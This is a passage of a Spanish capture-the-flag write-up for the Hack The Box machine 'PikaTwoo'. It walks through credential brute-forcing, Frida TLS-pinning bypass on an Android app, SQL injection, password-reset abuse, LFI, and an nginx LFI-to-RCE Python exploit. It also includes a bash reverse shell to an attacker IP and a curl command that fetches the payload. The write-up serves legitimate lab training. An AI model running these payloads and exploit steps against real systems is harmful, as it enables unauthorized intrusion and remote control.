</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v2.0.0-dev
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : POST
</span></span><span style="display:flex;"><span> :: URL              : http://10.10.11.199:5000/v3/auth/tokens
</span></span><span style="display:flex;"><span> :: Wordlist         : F1: /proc/self/fd/12
</span></span><span style="display:flex;"><span> :: Wordlist         : F2: /opt/SecLists/Usernames/Names/names.txt
</span></span><span style="display:flex;"><span> :: Header           : Content-Type: application/json
</span></span><span style="display:flex;"><span> :: Data             : <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;auth&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;identity&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;methods&#34;</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">]</span>, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;user&#34;</span>: <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;F2&#34;</span>,<span style="color:#e6db74">&#34;domain&#34;</span>: <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;default&#34;</span> <span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;fake_passwordF1&#34;</span> <span style="color:#f92672">}</span> <span style="color:#f92672">}</span> <span style="color:#f92672">}</span> <span style="color:#f92672">}</span> <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span> :: Follow redirects : false
</span></span><span style="display:flex;"><span> :: Calibration      : true
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5623ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>    * F2: admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5662ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>    * F2: admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5725ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>    * F2: admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 6345ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>    * F2: admin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4498ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>    * F2: andrew
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4498ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>    * F2: andrew
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 4709ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>    * F2: andrew
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5355ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>    * F2: andrew
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5416ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>    * F2: andrew
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Status: 401, Size: 124, Words: 7, Lines: 2, Duration: 5471ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    * F1: <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>    * F2: andrew
</span></span></code></pre></div><p>Encontramos que hay un usuario llamado <code>Andrew</code> también.</p>
<p>Si nos ponemos a investigar en la pagina oficial veremos que este servicio suele usar un proxy llamado <code>swift</code>, en el cual podemos usar el usuario que hemos conseguido</p>
<p><img src="/htb/PikaTwoo/images/9.png" alt="Pika"></p>
<p>Probamos a hacer un curl a esta dirección y veremos que existe pero que no podemos acceder, esto nos deja saber que este directorio existe</p>
<p><img src="/htb/PikaTwoo/images/10.png" alt="Pika"></p>
<p>Viendo que ese directorio existe, podemos probar a listar los directorios de esta nueva ruta, a ver si tenemos algo interesante, por lo que voy a usar la herramienta <code>Feroxbuster</code></p>
<p><img src="/htb/PikaTwoo/images/11.png" alt="Pika"></p>
<h2 id="Descarga_app">Descarga de la app</h2>
<p>Perfecto tenemos un /android, que junto a la información del <code>CHANGELOG</code> que hemos visto antes nos da la idea de que por ahí puede ir la explotación, si entramos a esta pagina veremos esto:</p>
<p><img src="/htb/PikaTwoo/images/12.png" alt="Pika"></p>
<p>Podemos descargarnos la apk con un wget</p>
<p><img src="/htb/PikaTwoo/images/13.png" alt="Pika"></p>
<p>Ahora que tenemos la <code>apk</code> en nuestro equipo</p>
<p>podemos debugearla con este comando, para ver los archivos internos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apktool d pokatmon-app.apk
</span></span></code></pre></div><p>Con esto conseguiremos una carpeta con los archivos internos de la app, ahora podemos <code>virtualizar</code> el android, para probar la apk</p>
<p>Para esto usaremos Genymotion</p>
<p><img src="/htb/PikaTwoo/images/14.png" alt="Pika"></p>
<p>En mi caso ya tengo creado el móvil a virtualizar, pero para crearlo es simplemente darle al + y dejar todo por defecto, una vez que tengamos el Android corriendo podemos simplemente arrastrar el apk en el android para pasarle la apk</p>
<p><img src="/htb/PikaTwoo/images/15.png" alt="Pika"></p>
<p>Ahora si ejecutamos la app veremos algo interesante, nos pide un correo y un código, los cuales no tenemos</p>
<p><img src="/htb/PikaTwoo/images/16.png" alt="Pika"></p>
<h2 id="Reconocimiento_app">Reconocimiento de la app</h2>
<p>Ya que todo esto esta corriendo en local podemos probar interceptando la peticion con Wireshark, veremos a donde esta tratando de mandar la solicitud (<code>api.pokatmon-app.htb</code>)</p>
<p><img src="/htb/PikaTwoo/images/17.png" alt="Pika"></p>
<p>Siendo ese el caso podemos intentar que nos mande a nosotros la peticion, modificando el <code>/etc/hosts</code> del android, para eso primero nos conectamos con abd, para tener una consola del movil</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb shell
</span></span></code></pre></div><p>Ahora usamos este comando</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mount -o remount,rw /
</span></span></code></pre></div><p>Y modificamos el /etc/hosts con nuestra ip</p>
<p><img src="/htb/PikaTwoo/images/18.png" alt="Pika"></p>
<p>como ahora la peticion sera hacia nosotros, podemos interceptarla con burpsuite, creamos un proxy que escuche por el puerto <code>8443</code> (no me dejaba por el <code>443</code>) y que como destino lleve al puerto <code>443</code> de la maquina de htb</p>
<p><img src="/htb/PikaTwoo/images/19.png" alt="Pika"></p>
<p>Y ahora redirigimos todas las peticiones que nos lleguen en el puerto <code>443</code> al <code>8443</code> para que pase por burpsuite, lo hacemos con este comando</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socat TCP-LISTEN:443,fork,reuseaddr TCP:127.0.0.1:8443
</span></span></code></pre></div><p>Una vez tenemos todo esto, podemos ver que si enviamos la peticion en el android, no nos llega en el burpsuite, esto es debido a que la peticion usa un certificado ssl que nosotros no tenemos, pero como esta aplicación esta corriendo en local, esta usando unos certificados ssl que tiene guardados dentro de la app, por lo que podemos usar frida para buscarlos</p>
<h2 id="SSL">Bypass del certificado SSL con Frida</h2>
<p>Para esto nos descargamos la version de <code>frida</code> &ndash;&gt; <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> (hay que descargar frida-server-16.1.4-android-x86_64)</p>
<p>Lo descomprimimos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>7z X frida-server-16.1.4-android-x86_64.xz
</span></span></code></pre></div><p>Y le cambiamos el nombre</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mv frida-server-16.1.4-android-x86_64 frida-server
</span></span></code></pre></div><p>Ahora lo metemos en el móvil</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb push frida-server /data/local/tmp/
</span></span></code></pre></div><p>Vamos a hacerlo ejecutable</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb shell <span style="color:#e6db74">&#34;chmod 755 /data/local/tmp/frida-server&#34;</span>
</span></span></code></pre></div><p>Y finalmente lo <code>ejecutamos</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>adb shell <span style="color:#e6db74">&#34;/data/local/tmp/frida-server &amp;&#34;</span>
</span></span></code></pre></div><p>Si todo esto esta bien hecho, podremos ejecutar este comando (dejando en segundo plano el anterior comando)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>frida-ps -U
</span></span></code></pre></div><p>Ahora podemos ver todos los procesos que esta corriendo el móvil, con esto hecho podemos empezar a bypasear el <code>ssl</code>, para esto usaremos este script de frida</p>
<p>GitHub del script &ndash;&gt; <a href="https://github.com/NVISOsecurity/disable-flutter-tls-verification/blob/main/disable-flutter-tls.js">https://github.com/NVISOsecurity/disable-flutter-tls-verification/blob/main/disable-flutter-tls.js</a></p>
<p>Creamos un archivo .js en nuestro equipo con el contenido del script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nvim flutter-disable-tls.js
</span></span></code></pre></div><p>Ahora ejecutamos este script después de cerrar la aplicación Pokatmon, para que nos la vuelva abrir pero si importarle el certificado <code>ssl</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>frida -U -l flutter-disable-tls.js -f htb.pokatmon.pokatmon_app
</span></span></code></pre></div><p>Ahora si ponemos cualquier correo y código, podremos ver la peticion en <code>burpsuite</code></p>
<p><img src="/htb/PikaTwoo/images/20.png" alt="Pika"></p>
<h2 id="firma">Bypass de la firma del certificado</h2>
<p>Esta es la peticion de <code>burpsuite</code></p>
<p><img src="/htb/PikaTwoo/images/21.png" alt="Pika"></p>
<p>Si desencriptamos la firma, veremos que no tiene nada especial, es una básica, pero cuando estuvimos viendo los archivos de la apk vimos una llave publica y una privada</p>
<p><img src="/htb/PikaTwoo/images/22.png" alt="Pika"></p>
<p>Para firmar un certificado con estas claves podemos hacerlo así, directamente en base64 (el arroba tiene que estar sin url encodear):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl dgst -sha256 -sign private.pem &lt;<span style="color:#f92672">(</span>echo -n <span style="color:#e6db74">&#34;app_beta_mailaddr=hey@gmail.com&#39;&amp;app_beta_code=1234&#34;</span><span style="color:#f92672">)</span> | base64 -w <span style="color:#ae81ff">0</span> ; echo
</span></span></code></pre></div><p>Finalmente nos esta dando otra tipo de respuesta</p>
<p><img src="/htb/PikaTwoo/images/23.png" alt="Pika"></p>
<h2 id="SQLI">SQLI al loggin de la app</h2>
<p>Ahora podemos intentar una inyección <code>SQL</code> (todo lo que cambies en el mensaje se tiene que firmar otra vez)</p>
<p><img src="/htb/PikaTwoo/images/24.png" alt="Pika"></p>
<p>Y nos da un email y un código!, si lo introducimos nos dara un <code>error</code></p>
<p><img src="/htb/PikaTwoo/images/25.png" alt="Pika"></p>
<p>Para solucionar esto tenemos que modificar el /etc/hosts de el android</p>
<p><img src="/htb/PikaTwoo/images/26.png" alt="Pika"></p>
<p>Ahora si introducimos las credenciales, nos entrara a la app</p>
<p><img src="/htb/PikaTwoo/images/27.png" alt="Pika"></p>
<h2 id="APISIX">Explotación de APISIX para conseguir la contraseña</h2>
<p>Aquí no tenemos nada, pero tenemos un correo, en la pagina principal había un apartado para recuperar la contraseña a traes del correo, si ponemos el correo y interceptamos al peticion con burpsuite, veremos que nos manda a un <code>forbidden</code></p>
<p><img src="/htb/PikaTwoo/images/28.png" alt="Pika"></p>
<p>Si modificamos un poco la peticion, veremos que nos da un token</p>
<p><img src="/htb/PikaTwoo/images/29.png" alt="Pika"></p>
<p>Aunque aquí no podemos hacer nada, hay que recordar que tenemos el puerto 443 al que no podemos acceder, y si vemos los escaneos de nmap veremos que usa la version de <code>APISIX/2.10.1</code></p>
<p><img src="/htb/PikaTwoo/images/30.png" alt="Pika"></p>
<p>Esta version tiene varias vulnerabilidades, una de ellas nos permite saltarnos la autenticacion de la <code>API</code></p>
<p>CVE &ndash;&gt; <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45232">https://nvd.nist.gov/vuln/detail/CVE-2021-45232</a></p>
<p>Probando otras cosas vemos que si hacemos un <code>freoxbuster</code> al https de la pagina principal, nos da varios códigos de estado <code>403</code> para todo lo que contenga private</p>
<p><img src="/htb/PikaTwoo/images/31.png" alt="Pika"></p>
<p>Podemos probar a hacer un curl, pero veremos que no tenemos acceso</p>
<p><img src="/htb/PikaTwoo/images/32.png" alt="Pika"></p>
<p>si hacemos otro feroxbuster dentro del directorio <code>/private</code> nos encontraremos algo bastante interesante (urlencodeando e ultimo carácter para que no nos lo bloquee)</p>
<p><img src="/htb/PikaTwoo/images/33.png" alt="Pika"></p>
<h2 id="Password_Reset">Abuso del apartado Password Reset</h2>
<p>Podemos acceder al /password-reset, desde burpsuite accedemos a este directorio, pero veremos el siguiente mensaje</p>
<p><img src="/htb/PikaTwoo/images/34.png" alt="Pika"></p>
<p>Si modificamos la peticion introduciendo el email, nos dará un token, muy parecido al que nos daba al intentar recuperar la contraseña.</p>
<p><img src="/htb/PikaTwoo/images/35.png" alt="Pika"></p>
<p>Si introducimos ese token en la peticion pasada a <code>POST</code> y le introducimos el token y la new password conseguiremos cambiarla al fin</p>
<p><img src="/htb/PikaTwoo/images/36.png" alt="Pika"></p>
<p>Ahora si nos logreamos con la nueva contraseña tendremos acceso a este panel</p>
<p><img src="/htb/PikaTwoo/images/37.png" alt="Pika"></p>
<p>Si interceptamos la primera peticion veremos esto:</p>
<p><img src="/htb/PikaTwoo/images/38.png" alt="Pika"></p>
<p>Si le añadimos el <code>debug</code> nos dará otro tipo de error</p>
<p><img src="/htb/PikaTwoo/images/39.png" alt="Pika"></p>
<h2 id="LFI">Explotación del LFI</h2>
<p>Según este post, es posible hacer un <code>LFI</code></p>
<p>CVE &ndash;&gt; <a href="https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/">https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/</a></p>
<p>La peticion seria la siguiente:</p>
<p><img src="/htb/PikaTwoo/images/40.png" alt="Pika"></p>
<h2 id="RCE">Paso de LFI a RCE usando nginx</h2>
<p>Si buscamos por internet veremos que hay una manera de pasar el <code>LFI</code> a un <code>RCE</code> a través de nginx</p>
<p>Post &ndash;&gt; <a href="https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/">https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/</a></p>
<p>Si usamos este script, seremos capaces de ejecutar comandos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> threading<span style="color:#f92672">,</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># exploit PHP local file inclusion (LFI) via nginx&#39;s client body buffering assistance</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/a&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># # find nginx worker processes </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># r  = requests.get(URL, params={</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     &#39;file&#39;: &#39;/proc/cpuinfo&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># })</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cpus = r.text.count(&#39;processor&#39;)</span>
</span></span><span style="display:flex;"><span>cpus <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># r  = requests.get(URL, params={</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     &#39;file&#39;: &#39;/proc/sys/kernel/pid_max&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># })</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pid_max = int(r.text)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(f&#39;[*] cpus: {cpus}; pid_max: {pid_max}&#39;)</span>
</span></span><span style="display:flex;"><span>pid_max <span style="color:#f92672">=</span> <span style="color:#ae81ff">4194304</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nginx_workers <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> pid <span style="color:#f92672">in</span> range(pid_max):
</span></span><span style="display:flex;"><span>    r  <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(URL, 
</span></span><span style="display:flex;"><span>            data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;region&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;../../proc/</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/cmdline&#39;</span>},
</span></span><span style="display:flex;"><span>            cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;SESSa&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>}
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;nginx: worker process&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>content:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[*] nginx worker found: </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        nginx_workers<span style="color:#f92672">.</span>append(pid)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(nginx_workers) <span style="color:#f92672">&gt;=</span> cpus:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>done <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># upload a big client body to force nginx to create a /var/lib/nginx/body/$X</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">uploader</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] starting uploader&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> done:
</span></span><span style="display:flex;"><span>        requests<span style="color:#f92672">.</span>post(URL, data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0xdf0xdf</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;?php system(&#34;id&#34;); /*&#39;</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#75715e">## Ejecucion del comando</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>uploader)
</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># brute force nginx&#39;s fds to include body files via procfs</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use ../../ to bypass include&#39;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bruter</span>(pid):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> done
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> done:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[+] brute loop restarted: </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> fd <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>            f <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;../../proc/self/fd/</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/../../../</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/fd/</span><span style="color:#e6db74">{</span>fd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>            r  <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(URL, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;region&#39;</span>: f}, cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;SESSa&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>})
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>text <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;0xdf0xdf&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[!] </span><span style="color:#e6db74">{</span>f<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>                done <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> pid <span style="color:#f92672">in</span> nginx_workers:
</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>bruter, args<span style="color:#f92672">=</span>(pid, ))
</span></span><span style="display:flex;"><span>    a<span style="color:#f92672">.</span>start()
</span></span></code></pre></div><p>Modificando el comando a ejecutar seremos capaces de hacer un curl a nuestra propia maquina, y el resto ya es sencillo, creamos un archivo que contenga una <code>reverse shell</code> a nuestro equipo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Usamos el script para que nos haga una peticion a nuestro servidor http y que se descargue este archivo en el directorio /tmp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl 10.10.14.6:8080/shell -o /tmp/shell
</span></span></code></pre></div><p>Después ejecutamos el script una vez mas, pero con el comando para ejecutar la shell (y nos ponemos en escucha por el puerto <code>4444</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash /tmp/shell
</span></span></code></pre></div><p>Con esto tendremos acceso al usuario www</p>
<p><img src="/htb/PikaTwoo/images/41.png" alt="Pika"></p>
<p>Por el nombre del usuario nos podemos dar cuenta de que estamos en un contenedor (no tiene pinta de docker porque no hay una carpeta docker en la raiz), y si hacemos un cat a este archivito, veremos que estamos en un VMware</p>
<p><img src="/htb/PikaTwoo/images/42.png" alt="Pika"></p>
<p>Si nos metemos en el /sun/secrets veremos que tiene un kubernetes.io por lo que esta maquina esta corriendo kubernetes</p>
<p><img src="/htb/PikaTwoo/images/43.png" alt="Pika"></p>
<p>También nos encontramos un <code>token</code></p>
<p><img src="/htb/PikaTwoo/images/44.png" alt="Pika"></p>
<h2 id="Kubernetes">Explotacion de Kubernetes y APISIX para salir del contenedor</h2>
<p>Buscando sobre kubernetes me encontré este post, en el cual nos dice como bypasear la autenticacion del API de <code>kubernetes</code></p>
<p>POST &ndash;&gt; <a href="https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/">https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/</a></p>
<p>Por lo cual ejecutare estos comandos:</p>
